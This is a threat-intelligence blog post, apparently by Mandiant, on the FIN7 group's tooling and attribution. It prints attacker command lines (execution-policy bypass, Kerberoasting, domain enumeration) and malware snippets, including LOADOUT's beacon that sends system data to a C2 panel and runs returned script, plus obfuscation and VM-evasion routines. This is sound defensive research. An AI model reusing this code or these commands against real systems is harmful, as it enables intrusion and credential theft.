    "plain_text": "# FIN7 Power Hour: Adversary Archaeology and the Evolution of FIN7\n\n**mandiant.com/resources/evolution-of-fin7**\n\nRecent public research asserts threat groups sharing overlaps with FIN7 transitioned to targeted\nransomware operations involving REVIL, DARKSIDE, BLACKMATTER, and ALPHV ransomware. With\nthe purported shift to ransomware operations, Mandiant is publishing our research on the evolution of\n[FIN7 which we haven’t publicly written about since Mahalo FIN7, published in 2019.](https://www.mandiant.com/resources/mahalo-fin7-responding-to-new-tools-and-techniques)\n\nThis blog post draws on organic research from both historical and recent intrusions that Mandiant\ndirectly investigated, and describes the process of merging multiple UNC groups into FIN7. This\nprocess allowed us to merge eight previously suspected UNC groups into FIN7 in January 2022. We\nalso highlight notable shifts in FIN7 activity over this time, including their use of novel malware,\nincorporation of new initial access vectors, and likely shift in monetization strategies.\n\nFIN7 continued to leverage PowerShell throughout their intrusions, including in a new backdoor\ncalled POWERPLANT, which FIN7 has continually developed over the last two years. We also\nidentified new versions of the BIRDWATCH downloader being developed, which are tracked as\nCROWVIEW and FOWLGAZE.\nFIN7’s initial access techniques have diversified to include software supply chain compromise\nand the use of stolen credentials, in addition to their traditional phishing techniques. We also\nobserved FIN7 use POWERPLANT as their first stage malware instead of LOADOUT and/or\nGRIFFON in newer intrusions.\nData theft extortion or ransomware deployment following FIN7-attributed activity at multiple\norganizations, as well as technical overlaps, suggests that FIN7 actors have been associated\nwith various ransomware operations over time.\n\n\n-----\n\nMandiant is also tracking multiple, notable campaigns as separate UNC groups that we suspect\nare FIN7, including a “BadUSB” campaign leading to DICELOADER, and multiple phishing\ncampaigns leveraging cloud marketing platforms leading to BIRDWATCH.\n\nWe first disclosed [threat reporting and publicized research on FIN7 in 2017. Since then, we’ve](https://www.mandiant.com/resources/fin7-phishing-lnk)\npublished multiple blog posts on FIN7 operations, with more extensive content available on Mandiant\nAdvantage. In this blog post, we focus on examining the most recent FIN7 intrusion operations, as well\nas the attribution methodologies that we used.\n\n## Threat Attribution Over Time\n\nOur attribution methodology requires multiple layers of overlaps within collected threat data to merge\n_suspected FIN7 UNC groups into our core FIN7 cluster. Merge evidence is sourced from analysis of_\nattacker infrastructure, intrusion tradecraft, modus operandi, and how specific code is employed by the\ngroups we research. Rigorous documentation of technical evidence is critical for modern cybercrime\nattribution, when considering the fluid and opportunistic nature of cybercriminal operations, as well as\nindividual operators’ narrow allegiances to criminal organizations. It is also common for us to observe\nmultiple threat groups engaging in intrusion operations within close temporal proximity, sometimes\neven using the same access method within hours or minutes of each other. This is especially notable\nin the ransomware ecosystem, where Mandiant has observed individual members shift teams, and\nteams migrate between affiliate programs commonly adopting different TTPs across intrusions\ndepending on who they are collaborating with or gaining access from at a given time.\n\nTo date, we suspect 17 additional UNCs of being affiliated with FIN7 with varying levels of confidence;\nhowever, those groups have not been formally merged into FIN7. Those groups’ activity spans as far\nback as 2015 and as recently as late 2021, across 36 separate intrusions. Eight previously suspected\nFIN7 UNC groups, active since 2020, have recently been merged into FIN7, confirming the resilience\nof actors associated with the threat group.\n\n### 2020 Activity Brief: Heavy on the LOADOUT\n\nFIN7 was active during the spring and summer of 2020, conducting phishing campaigns and\nattempting to distribute LOADOUT and GRIFFON. During that time, five UNC groups were created to\ntrack various campaigns, which eventually were merged into our new splinter group of FIN7, following\nmerge analysis later in 2021 that expanded our understanding of FIN7. The impacts of related UNC\nmerges for 2020 activity added usage of code families LOADOUT, TAKEOUT and a BIRDWATCH\nvariant into FIN7.\n\n\n-----\n\nFigure 1:\n\nFIN7 Activity in 2020-2021\nLOADOUT is an obfuscated VBScript-based downloader which harvests extensive information from\nthe infected system. The harvested information is then sent to a command-and-control (C2) server. C2\nserver responses for LOADOUT infections delivered GRIFFON, a JavaScript-based downloader which\nretrieves additional JavaScript modules using HTTP or DNS and executes them in memory.\n\nIn late summer of 2020, FIN7 capped off their busy year with the first observed usage of\nPOWERPLANT. POWERPLANT, also referred to as “KillACK”, is a PowerShell-based backdoor with a\nbreadth of capabilities, initially delivered following a successful GRIFFON infection in August 2020.\nMerges involving the usage of POWERPLANT into 2021 led us to assess that FIN7 is likely the only\noperator using POWERPLANT.\n\n### 2021 Activity Brief: A Shift to POWERPLANT\n\nWe identified an uptick in FIN7-suspected UNC group activity during 2021 across five intrusions,\nbeginning in April of 2021. The uptick led us to initiate a deep-dive research effort into FIN7. We also\nobserved FIN7 shift their initial access techniques away from using LOADOUT, GRIFFON or\nCARBANAK in favor of direct deployment of POWERPLANT and BEACON. Specifically, FIN7 used\nPOWERPLANT in all observed intrusions in 2021. FIN7 also relied on BEACON as a secondary mode\nof access alongside some POWERPLANT infections.\n\nThroughout 2021 we scrutinized a multitude of FIN7-linked UNC groups to our breadth of past FIN7\nintelligence holdings, merging multiple threat clusters along the way. Our research revealed a fusion of\nolder FIN7 intrusion tradecraft, and new FIN7 malware.\n\n## PowerShell Archaeology: FIN7 Habits Die Hard\n\n\n-----\n\nThere is no doubt about it, PowerShell is FIN7 s love language. FIN7 has implemented malware into its\noffensive operations using many programming languages; however, during on-system interactions,\nFIN7’s preference for boutique PowerShell-based loaders and unique PowerShell commands is\ndominant.\n\nOur deep dive into prior FIN7 intrusions dating as far back as 2019 bubbled up several long-standing\npatterns of unique PowerShell invocations still being used today. In the first example, command lines,\nsuch as in Figure 2 and Figure 3, had overall low-global prevalence outside of FIN7 and suspected\nFIN7 UNCs.\n\nFigure 2: FIN7 PowerShell Execution from 2019\n```\n cmd.exe /c start %SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe  noni -nop -exe bypass -f <REDACTED>/ADMIN$/temp/wO9EBGmDqwdc.ps1\n\n```\nFigure 3: FIN7 PowerShell Execution from 2021\n```\n cmd.exe /c start %SYSTEMROOT%\\system32\\WindowsPowerShell\\v1.0\\powershell.exe  noni -nop -exe bypass -f \\\\<REDACTED>\\Admin$\\c5k3fsys.3bp.ps1\n\n```\nThe unique aspect in the Figure 2 and Figure 3 commands is the distinct parameters -noni -nop -exe\n**bypass -f, for launching scripts located in Admin shares and installing Windows services. Since 2019,**\nwe have observed FIN7 use command line parameters such as these while interacting with victim\nsystems through backdoor malware such as CARBANAK. We have since seen a shift of some of these\ndistinct PowerShell commands being initiated through POWERPLANT infections.\n\nSmaller patterns and consistencies across FIN7 intrusions from 2019 and beyond reveal more distinct\nPowerShell command lines using -ex bypass -f or -ex bypass -file as passed parameters. Although\nthose patterns appear modest to hunt for, the combinations have extremely low global prevalence\noutside of FIN7-associated threat activity. For example, the first command line pattern has been seen\nover 2800 times, all of which were events attributed to FIN7. The second command line pattern has\nbeen seen nearly 250 separate times at 10 different victims as far back as 2019, all of which were\nFIN7 attributed commands.\n\nFigure 4: FIN7 PowerShell Execution from 2019\n\n```\npowershell.exe -ex bypass -file C:\\windows\\temp\\fdddu32.ps1\n\n```\n\nFigure 5: FIN7 PowerShell Execution from 2020\n\n```\npowershell.exe -ex bypass -f c:\\users\\public\\temp\\AC-Win10w-x64.ps1\n\n```\n```\npowershell.exe -ex bypass -f C:\\Users\\Public\\Videos\\AC-Bot-x64.ps1\n\n```\n\nFigure 6: FIN7 PowerShell Executions from 2021\n\n\n-----\n\n```\npowershell.exe -ex bypass -f pkit.ps1          \n\n```\n```\npowershell.exe -ex bypass -f cube.ps1\n\n```\n\nIn addition to FIN7’s unique command lines during intrusion operations, we identified long-standing\nusage of other PowerShell code families, such as POWERTRASH. POWERTRASH is an in-memory\ndropper, or loader, written in PowerShell that executes an embedded payload. Observed payloads\nloaded by FIN7’s POWERTRASH include CARBANAK, DICELOADER, SUPERSOFT, BEACON and\nPILLOWMINT. POWERTRASH is a uniquely obfuscated iteration of a shellcode invoker included in the\n[PowerSploit framework available on GitHub.](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1)\n\nWith this improved understanding of FIN7 intrusion operations, we assembled our analytical efforts to\nbegin merging multiple suspected UNCs into FIN7. As part of this initiative, we identified new FIN7\nmissions targeting our customers, including a Managed Defense Rapid Response engagement in\n2021.\n\n## Managing a Defense\n\nFIN7 has targeted a broad spectrum of organizations in multiple industries, including Software,\nConsulting, Financial Services, Medical Equipment, Cloud Services, Media, Food and Beverage,\nTransportation, and Utilities. We identified over a dozen intrusions attributed to FIN7 since 2020 across\nour client base. The following use case profiles recent FIN7 tradecraft during a Mandiant Managed\nDefense engagement in 2021.\n\n### FIN7 From the Trenches\n\nTo obtain initial access during this intrusion, FIN7 used compromised Remote Desktop Protocol (RDP)\ncredentials to login to a target server across two separate days, and initiated two similar Windows\nprocess chains (Figure 7).\n\nFigure 7: Two FIN7 process event chains\n\n```\nrdpinit.exe\n\n```\n\n↳ notepad++.exe\n\n\n↳ cmd.exe\n\n\n↳ powershell.exe\n\n```\nrdpinit.exe\n\n```\n\n↳ notepad++.exe\n\n\n↳ cmd.exe\n\n\n↳ rundll32.exe\n\n\nFIN7 used established RDP access to eventually install other modes of host control, first by executing\nPowerShell reconnaissance scripts, then by executing a TERMITE loader (Figure 8).\n\n\n-----\n\nFigure 8: Command line used to load FIN7 TERMITE\n\n```\nRunDll32 TstDll.dll,TstSec 11985756          \n\n```\n\nTERMITE is a password-protected shellcode loader which we have observed at least seven distinct\nthreat groups use to load BEACON, METASPLOIT, and BUGHATCH shellcodes. FIN7 used TERMITE\nto load and execute a shellcode stager for Cobalt Strike BEACON in this case.\n\nFollowing secondary access of BEACON, FIN7 began further enumeration using built-in Windows\ncommands as well as POWERSPLOIT and Kerberoasting PowerShell modules.\n\n```\ncmd.exe /C net group \"Domain Admins\" /domain\n\n```\n```\ncmd.exe /C quser\n\n```\n```\npowershell.exe -c import-module C:\\Users\\Public\\kerberoast_hex.ps1; InvokeKerberoast -OutputFormat HashCat > hash.txt\npowershell.exe -ex bypass -c import-module C:\\Users\\Public\\kerberoast_hex.ps1;\nInvoke-Kerberoast -OutputFormat HashCat\n\n```\n```\npowershell.exe -ex bypass -f pkit.ps1\n\n```\n\nAfter the initial reconnaissance using RDP and BEACON, FIN7 executed an obfuscated loader for a\nvictim-customized variant of the PowerShell-based backdoor POWERPLANT, providing tertiary\naccess:\n\n```\npowershell.exe -ex bypass -f cube.ps1\n\n```\n\nFIN7 then attempted to steal credentials and further compromise the victims’ environment with limited\nsuccess, as the client was able to respond and quickly remediate with the advantage of Managed\nDefense responders.\n\nA unique aspect of this specific intrusion perfectly highlighted the challenges of technical attribution for\ncybercriminal threats: Between the two days of FIN7 operations on the victim system, FIN12 was also\nactive on the same victim for multiple hours using the same RDP account, but much different\ninfrastructure and tradecraft, attempting to install BEACON using the WEIRDLOOP in-memory dropper\nbefore the intrusion was remediated.\n\n## FIN7’s Evasion\n\nAmong FIN7’s [historical trademarks were their creative obfuscation and fast development of evasive](https://www.mandiant.com/resources/obfuscation-wild-targeted-attackers-lead-way-evasion-techniques)\ntechniques. This is still the case, with FIN7 first stage droppers and downloaders being heavily\nobfuscated. LOADOUT in particular, due to its wide distribution in opportunistic campaigns, has been\nthrough several iterations meant to improve evasion.\n\n\n-----\n\nThe initial obfuscation mechanism was basic but effective at evading static detections: the malicious\ncode was interspersed with random junk code (Figure 9). After a few months of successful\ncampaigning, AV detection engines improved coverage of the downloader. To get around this, and to\nsend a message, LOADOUT developer(s) broke up the beacon suspected to be used in detection\nsignatures by simply inserting “FUCKAV” into the strings (Figure 8).\n\nFigure 8: System survey information sent as beacon by LOADOUT\n```\n data = \"id=\" & get_id() & \"&FUCKAVtype=put\" & get_computer_info(\"\") &\n \"&DomainHosts=\" & count_domain_hosts() & \"&UserName=\" & usFUCKAVername &\n \"&LogicalDrives=\" & get_grivers() &\n \"&SystemInfo=nothing&SoftwareInfo=nothing&NetworkInfo=nothingFUCKAV&ProcessList=\"\n & get_processlist() & \"&DesktopFileList=\" & get_desktopfiles() &\n \"&DesktopScreenshFUCKAVot=nothing&WebHistory=nothing&stype=vbs\"\n\n```\n```\nresponse = send(panel_url, data)\n\n```\n```\nif response = \"okFUCKAV\" then\n\n```\n```\n js = send(panel_url, \"\")\n\n```\n```\n run_js(js)\n\n```\n```\nend ifFUCKAV\n\n```\n\nFigure 9: LOADOUT obfuscation\n\n```\nkiki=ado.ReadText\n\n```\n```\n' OE5QAJ2VaFCK F5\n\n```\n```\nDim yiups\n\n```\n```\nyiups = \"UTo\"\n\n```\n```\nWScript.Echo(\"  error  \")\n\n```\n```\nkok = replace(kiki, \"FUCKAV\", \"\")\n\n```\n```\nulpo = \"12\"\n\n```\n```\naoso = year(\"01/07/12\")\n\n```\n```\nif right(aoso, 2) = ulpo then\n\n```\n```\nexecute(\"WScript.Echo(\"\"  file is corrupted  \"\"):\" & kok)\n\n```\n```\nend if\n\n```\n```\n'hello bitchw\n\n```\n\nIndeed, the developer(s) was correct to be suspicious that these strings were being used for detection.\nBy pivoting on the beacon, we discovered a new, work-in-progress variant of LOADOUT submitted to\nVirusTotal (MD5: 485b2a920f3b5ae7cfad93a4120ec20d), detected by only one engine (Figure\n\n\n-----\n\n10). Two hours later, a new version was submitted (MD5: 012e7b4d6b5cb8d46771852c66c71d6d), this\ntime with the offending PowerShell command obscured through their custom obfuscation mechanism\n(Figure 11).\n\nFigure 10: PowerShell command before obfuscation\n\n```\n  objTS.WriteLine(TextCrypt)\n\n```\n```\n  objTS.Close\n\n```\n```\n  pwsh_command = \"powershell.exe -executionpolicy bypass -file \" & FileName &\n\".ps1\"\n\n```\n```\n  objWSH.Run pwsh_command, 0, True\n\n```\n```\n  FSO.DeleteFile FileName & \".ps1\"\n\n```\n\nFigure 11: PowerShell command obfuscation\n```\n          Text1 =\n \"/3/3.1/2.1,7/2/2.0/3+4+5/4/2*3,7.0,7/2/2.1/4.0,6/3/3.0/3.0+5/4+5 9/4.1+5/4/3*3,7.0,6/3/2*3272327272412292326241618252310112117262125222518252429242516\n 261416272214202710112212232310\"\n          TextCrypt = Encryption(MakeCryptoText(TextUnShifter(Text1)),\n False)\n\n```\n```\n  pwsh_command = TextCrypt & FileName & \".ps1\"\n\n```\n```\n  objWSH.Run pwsh_command, 0, True\n\n```\n```\n  FSO.DeleteFile FileName & \".ps1\"\n\n```\n\nFIN7 actors have historically tested their tools against public repositories to check static detection\nengine coverage. It is likely that in this case, they were testing the strength of their custom obfuscation.\n\nThis new and improved version of LOADOUT emerged five months later. It was refactored to add\nmultiple layers of obfuscation, including interspersed Bible verses as filler text, and string obfuscation\nthrough a custom mechanism (Figure 12).\n\nFigure 12: LOADOUT custom string obfuscation\n\n```\nPrivate Function GetShiftKey()\n\n```\n```\nOn Error Resume Next\n\n```\n```\nSet Key = CreateObject(\"Scripting.Dictionary\")\n\n```\n```\nl = Len(CryptoKey)\n\n```\n```\ni1 = 0\n\n```\n```\n  With Key\n\n```\n```\n    For i = 1 To l\n\n```\n\n-----\n\n```\n      s Mid(CryptoKey, i, 1)\n\n```\n```\n      n = (Asc(s) Mod 8) + 1\n\n```\n```\n      If Not .Exists(n) Then\n\n```\n```\n        .Add n, n\n\n```\n```\n        i1 = i1 + 1\n\n```\n```\n      End If\n\n```\n```\n      If i1 = 9 Then Exit For\n\n```\n```\n    Next\n\n```\n```\n    If i >= l And i1 < 9 Then\n\n```\n```\n      For i = 1 + 1 To 8\n\n```\n```\n        If Not .Exists(i) Then\n\n```\n```\n          .Add i, i\n\n```\n```\n        End If\n\n```\n```\n      Next\n\n```\n```\n    End If\n\n```\n```\n    For i = 1 To 8\n\n```\n```\n      GetShiftKey = GetShiftKey + .Items()(i)\n\n```\n```\n    Next\n\n```\n```\n  End With\n\n```\n```\nEnd Function\n\n```\n```\nPrivate Function TextShifter(txt)\n\n```\n```\n  Dim nKeys(), out()\n\n```\n```\n  Key = GetShiftKey\n\n```\n```\n  n = Len(Key)\n\n```\n```\n  If n = 0 Then Exit Function\n\n```\n```\n  l = Len(txt)\n\n```\n```\n  m = -Int(-l / n)\n\n```\n```\n  ReDim nKeys(n)\n\n```\n```\n  For i = 1 To n\n\n```\n```\n    s1 = Mid(Key, i, 1)\n\n```\n```\n    For j = 1 To n\n\n```\n```\n      s2 = Mid(Key, j, 1)\n\n```\n\n-----\n\n```\n      If s1 s2 Or (s1 s2 And j  i) Then\n\n```\n```\n        nKeys(i) = nKeys(i) + 1\n\n```\n```\n      End If\n\n```\n```\n    Next\n\n```\n```\n  Next\n\n```\n```\n  ReDim out(n * m)\n\n```\n```\n  For i = 1 To Len(txt)\n\n```\n```\n    out(nKeys((i - 1) Mod n + 1) * m + (i - 1) \\ n - m + 1) = Mid(txt, i, 1)\n\n```\n```\n  Next\n\n```\n```\n  TextShifter = Join(out, \"\")\n\n```\n```\nEnd Function\n\n```\n\n## POWERPLANT: FIN7’s PowerShell Workhorse\n\nFIN7 has leveraged multiple methods of initial and secondary access into victim networks including\nphishing, compromising third-party systems, Atera agent installers, GoToAssist, and RDP. In a recent\ncase, FIN7 actors compromised a website that sells digital products and modified multiple download\nlinks to point to an Amazon S3 bucket hosting trojanized versions, containing an Atera agent installer.\nThis remote management tool was later used to deploy POWERPLANT to the victim system. This was\nthe first time Mandiant observed FIN7 leverage supply chain compromise. FIN7’s time-tested\n[CARBANAK and DICELOADER (also known as Lizar) malware continue to be in use; however, we](https://bi-zone.medium.com/from-pentest-to-apt-attack-cybercriminal-group-fin7-disguises-its-malware-as-an-ethical-hackers-c23c9a75e319)\nhave noticed FIN7 depend more on the POWERPLANT backdoor during recent intrusions.\n\nOur research into POWERPLANT has revealed that it is a vast backdoor framework with a breadth of\ncapabilities, depending on which modules are delivered from the C2 server. POWERPLANT backdoors\ncontain internal version identifiers within the code. We have identified samples ranging from version\n“0.012” through “0.028”, with examples shown in Table 1.\n\nTable 1: POWERPLANT samples\n\n**POWERPLANT Sample MD5** **Version**\n```\n 5a6bbcc1e44d3a612222df5238f5e7a8 0.012\n 0291df4f7303775225c4044c8f054360 0.016\n 3803c82c1b2e28e3e6cca3ca73e6cce7 0.019\n d1d8902b499b5938404f8cece2918d3d 0.021(TLS1)\n\n```\n\n-----\n\n```\n 833ae560a2347d5daf05d1f670a40c54 0.021b(SVC)\n edb1f62230123abf88231fc1a7190b60 0.021c(SVC)\n bce9b919fa97e2429d14f255acfb18b4 0.022\n b637d33dbb951e7ad7fa198cbc9f78bc 0.025\n 2cbb015d4c579e464d157faa16994f86 0.028\n\n```\nThe rate of increase in these internal version numbers over time suggests that FIN7 is actively\ndeveloping POWERPLANT (Figure 13). In one engagement, we observed FIN7 deploy incremented\nversions of POWERPLANT with tweaked functionality to targets in the middle of intrusion operations.\nDuring that engagement, versions “0.023” and “0.025” were both used within a 10-minute timeframe.\nEach version we have identified implements overall similar functionality with some programmatic\nimprovements and features added over time.\n\n\n-----\n\nFigure 13:\n\n\nPOWERPLANT version numbers\n\n\n-----\n\nMandiant also recovered portions of server-side code components from POWERPLANT controllers.\nSome of these components contain clues that hint at the operational security mindfulness of the\nmalware’s developers. Two such examples are FIN7 being aware of researchers investigating their\ninfrastructure, and employing capabilities to ban target host aspects such as usernames from the\npanel.\n\nFigure 14: Snippet of functions from POWERPLANT Server Settings\n\n```\ncheck_username\n\n```\n```\ncheck_hostdomain                            \n\n```\n```\ncheck_hostname\n\n```\n```\ncheck_hosts\n\n```\n```\ncheck_researcher\n\n```\n```\ncheck_desktop\n\n```\n\nFigure 15: Snippet of functions from POWERPLANT Server Settings\n\n```\n        if (res) {\n\n```\n```\n          localStorage.setItem('success-add-username', 'success-addusername-to-blacklist');\n\n```\n```\n          location.reload();\n\n```\n```\n        }\n\n```\n```\n      },\n\n```\n\nFigure 16: Snippet of functions from POWERPLANT Server Configuration\n\n\n-----\n\n```\n  /**\n\n```\n```\n   * Инициализация\n\n```\n```\n   */\n\n```\n```\n  init() {\n\n```\n```\n    this.config();\n\n```\n```\n    this.events();\n\n```\n```\n  },\n\n```\n```\n  /**\n\n```\n```\n   * Конфиги\n\n```\n```\n   */\n\n```\n```\n  config() {\n\n```\n```\n    this.config = {\n\n```\n```\n      window: $(window),\n\n```\n```\n      document: $(document),\n\n```\n```\n      content: $('#content'),                 \n\n```\n```\n      lastUrl: null,\n\n```\n```\n      isPage: true,\n\n```\n```\n      isModal: false,\n\n```\n```\n      intervalId: null,\n\n```\n```\n      timer: null,\n\n```\n```\n      selectedBots: []\n\n```\n```\n    };\n\n```\n```\n  }\n\n```\n\nDuring active C2 sessions, POWERPLANT servers will send multiple additional module types as\n“tasks” for target systems to execute. Two of these modules are EASYLOOK and BOATLAUNCH.\n\n### EASYLOOK Module\n\nEASYLOOK is a reconnaissance utility that FIN7 has used since at least 2019. EASYLOOK captures a\nwide range of data from infected systems, including operating system version, registration key, system\nname, username, domain information, and hardware specifications.\n\nThe initial version of EASYLOOK was delivered by a GRIFFON C2 server and written in JScript\n(Figure 18). FIN7’s updated variation of EASYLOOK was delivered by a POWERPLANT variant C2\nserver and written in PowerShell (Figure 17). Both versions implemented the exact same functionality\n\n\n-----\n\nacross two code languages, including the typo bios_versoin .\n\nFigure 17: VM check from new variant of FIN7 EASYLOOK coded in PowerShell\n\n```\nfunction is_wm {\n\n```\n```\n         $bios = Get-WMIObject Win32_Bios\n\n```\n```\n         $SerialNumber = $bios.SerialNumber\n\n```\n```\n         $bios_versoin = $bios.SMBIOSBIOSVersion\n\n```\n```\nIf ($SerialNumber.Contains(\"parallels\") -or $SerialNumber.Contains(\"vmware\")) {\n\n```\n```\n         return $true\n\n```\n```\n}\n\n```\n```\nIf ($bios_versoin.Contains(\"vmware\") -or $bios_versoin.Contains(\"virtualbox\")) {\n\n```\n```\n         return $true\n\n```\n```\n}\n\n```\n```\n         return $false\n\n```\n```\n}\n\n```\n\nFigure 18: VM check from first variant of FIN7 EASYLOOK coded in JavaScript\n\n\n-----\n\n```\nfunction is_vm () {\n\n```\n```\n  var biosRequest = wmi.ExecQuery('SELECT * FROM Win32_BIOS');\n\n```\n```\n  var biosItems = new Enumerator(biosRequest);\n\n```\n```\n  for (; !biosItems.atEnd(); biosItems.moveNext()) {\n\n```\n```\n    var bios_versoin = biosItems.item().SMBIOSBIOSVersion.toLowerCase();\n\n```\n```\n    var serial_number = biosItems.item().SerialNumber.toLowerCase();\n\n```\n```\n    if(serial_number.indexOf('parallels') >= 0 ||\nserial_number.indexOf('vmware') >= 0) {\n\n```\n```\n      return true;\n\n```\n```\n    }\n\n```\n```\n    if(bios_versoin.indexOf('vmware') >= 0 ||\nbios_versoin.indexOf('virtualbox') >= 0) {\n\n```\n```\n      return true;\n\n```\n```\n    }\n\n```\n```\n  }\n\n```\n```\n  return false;\n\n```\n```\n}\n\n```\n\n### BOATLAUNCH Module\n\nBOATLAUNCH is a utility sent from FIN7 POWERPLANT controllers that is used as a helper module\nduring intrusion operations. BOATLAUNCH is used to patch PowerShell processes on infected\nsystems to bypass Windows AntiMalware Scan Interface (AMSI). The malware loops, looking for\nunpatched PowerShell processes, and for each unpatched process the malware locates and patches\n_[amsi.dll!AmsiScanBuffer with a 5-byte instruction sequence to always return S_OK.](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)_\n\nThe technique used to patch AMSI is a variation of publicly described common AMSI bypass\ntechniques. Both 32bit and 64bit variants of BOATLAUNCH have been observed using the following\nexport directory DLL names (Table 2).\n\nTable 2: BOATLAUNCH PE Export Directory Names\n\n**BOATLAUNCH Bitness** **Export Directory Name**\n\n32-bit `amsi32_kill.dll`\n\n64-bit `amsi64_kill.dll`\n\n## The Curious Cases of BIRDWATCH\n\n\n-----\n\nOur deep dive also revealed usage of BIRDWATCH and its’ similar variants used by FIN7 and\nsuspected FIN7 groups such as UNC3381. BIRDWATCH is a .NET-based downloader which retrieves\npayloads over HTTP, writing them to disk and then executing them. BIRDWATCH uploads\nreconnaissance information from targeted systems as well, which includes running processes,\nsoftware installed, network configuration, web browser information and active directory data.\n\nBIRDWATCH is often referred to collectively as “JssLoader”; however, multiple variations of\nBIRDWATCH exist which we track as separate code families. One variant of BIRDWATCH is\nCROWVIEW, which is also .NET-based, but has enough code differences from prototypical\nBIRDWATCH that we cluster it separately. Unlike BIRDWATCH, CROWVIEW can house an embedded\npayload, can self-delete, supports additional arguments and stores a slightly different configuration.\n\nFIN7 has implemented similar or exact functionality in different programming languages, observed in\nvarious code families several times over the past few years. Similar to EASYLOOK, which has both\nJScript and PowerShell variants, BIRDWATCH and CROWVIEW have separate versions implemented\nin C++. This data point of code reuse and overlaps aided our technical attribution throughout multiple\nUNC merges, when combined with additional infrastructure and tradecraft analysis.\n\nIn this first example, programmatic collection of the BIOS (Basic Input Output System) serial number is\nshown across POWERPLANT and CROWVIEW code families.\n\nFigure 19: C# Code Snippet from FIN7-attributed CROWVIEW, a variant of BIRDWATCH\n\n\n-----\n\n```\nprivate static string GetBiosSerial()\n\n```\n```\n{\n\n```\n```\n         string result = \"BIOS UNKNOWN\";\n\n```\n```\n         try\n\n```\n```\n         {\n\n```\n```\n                  ManagementObjectSearcher\nmanagementObjectSearcher = new ManagementObjectSearcher(\"SELECT SerialNumber FROM\nWin32_BIOS\");\n                  ManagementObjectCollection\nmanagementObjectCollection = managementObjectSearcher.Get();\n                  foreach (ManagementBaseObject\nmanagementBaseObject in managementObjectCollection)\n\n```\n```\n                  {\n\n```\n```\n                           ManagementObject\nmanagementObject = (ManagementObject)managementBaseObject;\n                           result =\n(string)managementObject[\"SerialNumber\"];\n\n```\n```\n                  }\n\n```\n```\n         }\n\n```\n```\n         catch\n\n```\n```\n         {\n\n```\n```\n         }\n\n```\n```\n         return result;\n\n```\n```\n}\n\n```\n\nFigure 20: PowerShell Code Snippet from FIN7-attributed POWERPLANT\n\n\n-----\n\n```\nfunction Get-BiosSerial() {\n\n```\n```\n  $sn = \"BIOS UNKNOWN\"\n\n```\n```\n  $_sn = \"\"\n\n```\n```\n  try {\n\n```\n```\n    $mSearcher = Get-WmiObject -Query \"SELECT SerialNumber FROM Win32_BIOS\"\n\n```\n```\n    foreach ($o in $mSearcher) {\n\n```\n```\n      if ($o.Properties.Name -eq \"SerialNumber\") {\n\n```\n```\n        $_sn = $o.Properties.Value\n\n```\n```\n      }\n\n```\n```\n    }\n\n```\n```\n  }\n\n```\n```\n  catch {}\n\n```\n```\n  if ([String]::IsNullOrEmpty($_sn) -eq $false) { $sn = $_sn }\n\n```\n```\n  return \"$sn\";\n\n```\n```\n}\n\n```\n\nSystem enumeration data formatting overlaps also exist between FOWLGAZE and EASYLOOK. Both\ncode families implement near identical system surveys, with the shared usage of keys such as\n“pc_domain”, “pc_dns_host_name”, “pc_model” and “no_ad”.\n\nFigure 21: Data Collection JSON Format Snippet of FOWLGAZE(\"JssLoader\")\n```\n {\"host\":\"<HOSTNAME>\", \"domain\": \"<DOMAIN>\", \"user\":\"<USERNAME>\", \"processes\":\n [<PROCESS_LIST>],\"desktop_file_list\": [<FILE_LIST>],\"adinfo\":\n {\"adinformation\":\"no_ad\", \"part_of_domain\":\"no\", \"pc_domain\":\"\",\n \"pc_dns_host_name\":\"\", \"pc_model\":\"\"}}\n\n```\nFigure 22: Data Collection Code Snippet of EASYLOOK (Reconnaissance Module)\n\n\n-----\n\n```\n$result += ('username***' + $env:USERNAME)\n\n```\n```\n    $result += ('hostname***' + $env:COMPUTERNAME)\n\n```\n```\n    $elevated = $(whoami /groups).Contains(\"12288\")\n\n```\n```\n    If ($elevated) {\n\n```\n```\n      $result += 'yes'\n\n```\n```\n    }\n\n```\n```\n    Else {\n\n```\n```\n      $result += 'elevated***' + 'no'\n\n```\n```\n    }\n\n```\n```\n    $ad = get_active_directory_information\n\n```\n```\n    if ($ad) {\n\n```\n```\n      $result += ('adinformation***' + $ad)\n\n```\n```\n    } else {\n\n```\n```\n      $result += ('adinformation***no_ad')\n\n```\n```\n    }\n\n```\n```\n    $csRequest = Get-WmiObject Win32_ComputerSystem\n\n```\n```\n    $csRequest.PartOfDomain\n\n```\n```\n    If ($csRequest.PartOfDomain) {\n\n```\n```\n      $result += ('part_of_domain***yes')\n\n```\n```\n    }\n\n```\n```\n    else {\n\n```\n```\n       $result += ('part_of_domain***no')\n\n```\n```\n    }\n\n```\n```\n    $result += 'pc_domain***' + $csRequest.Domain\n\n```\n```\n    $result += 'pc_dns_host_name***' + $csRequest.DNSHostName     \n\n```\n```\n    $result += 'pc_model***' + $csRequest.Model\n\n```\n\nA final code reuse example is usage of \"theAnswer\", defined as variable within program functionality of\nPOST requests to C2 controllers for both CROWVIEW and POWERPLANT, as shown in Figure 23 and\nFigure 24.\n\nFigure 23: C# Code Snippet from FIN7-attributed CROWVIEW and BIRDWATCH (JssLoader)\n\n\n-----\n\n```\npublic void Put(string theAnswer)\n\n```\n```\n{\n\n```\n```\n         AppHttp.wCli.QueryString.Clear();\n\n```\n```\n         AppHttp.wCli.QueryString.Add(\"type\", \"put\");\n\n```\n```\n         string text =\nConvert.ToBase64String(Encoding.ASCII.GetBytes(AppParams.ProgID)).Replace(\"+\",\n\"***\");\n         string text2 =\nConvert.ToBase64String(Encoding.ASCII.GetBytes(\"put\")).Replace(\"+\", \"***\");\n\n```\n```\n         string body = string.Concat(new string[]\n\n```\n```\n         {\n\n```\n```\n                  \"id^^^\",\n\n```\n```\n                  text,\n\n```\n```\n                  \"&type^^^\",\n\n```\n```\n                  text2,\n\n```\n```\n                  \"&\",\n\n```\n```\n                  theAnswer\n\n```\n```\n         });\n\n```\n```\n         string text3 = this.HttpUpload(AppParams.URL_PutAnswer, body);\n\n```\n```\n}\n\n```\n\nFigure 24: PowerShell Code Snippet from FIN7-attributed POWERPLANT\n\n```\nFunction Send-ToConsole([String] $theAnswer) {\n\n```\n```\n  if ([String]::IsNullOrEmpty($theAnswer)) { return }\n\n```\n```\n  $_rc = \"\"\n\n```\n```\n  try 